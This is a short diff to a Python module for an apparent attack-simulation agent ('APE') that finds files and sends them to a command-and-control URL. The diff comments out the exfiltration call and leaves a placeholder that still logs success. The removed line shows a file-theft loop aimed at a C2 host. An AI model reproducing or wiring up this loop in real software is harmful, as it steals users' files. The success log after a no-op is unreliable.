@@ -3,7 +3,7 @@ import time
 import os
 from modules.scanner import intelligent_scan
 from modules.discovery import discover_files
-from modules.ace import ace_exfiltrate
+# from modules.ace import ace_exfiltrate # This will be re-implemented later
 
 # A list of simulated "vulnerabilities" the APE can "exploit"
 SIMULATED_VULNERABILITIES = {
@@ -51,7 +51,8 @@ class ApeAgent:
                 logging.info(f"APE: Found new file: {f}. Exfiltrating...")
                 try:
                     with open(f, 'rb') as file_data:
-                        ace_exfiltrate(file_data.read(), self.c2_url)
+                        # ace_exfiltrate(file_data.read(), self.c2_url) # Placeholder
+                        pass
                     self.exfiltrated_files.add(f)
                     logging.info(f"APE: Successfully exfiltrated {f}.")
                 except Exception as e:
